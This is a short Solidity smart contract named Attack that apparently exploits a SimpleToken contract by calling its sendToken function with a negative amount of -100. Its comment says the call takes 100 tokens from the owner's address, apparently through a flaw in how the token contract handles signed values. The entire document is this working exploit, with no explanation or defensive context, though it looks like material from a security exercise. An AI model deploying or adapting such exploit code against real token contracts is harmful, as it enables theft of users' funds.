contract Attack{

    SimpleToken public simpleToken;
    address ownerAddress;

    constructor(SimpleToken _simpleToken, address _ownerAddress) {
        simpleToken = SimpleToken(_simpleToken);
        ownerAddress = _ownerAddress;
    }

    //Take 100 from ownerAddress
    function attack() public {
        simpleToken.sendToken(ownerAddress, -100);
    }
}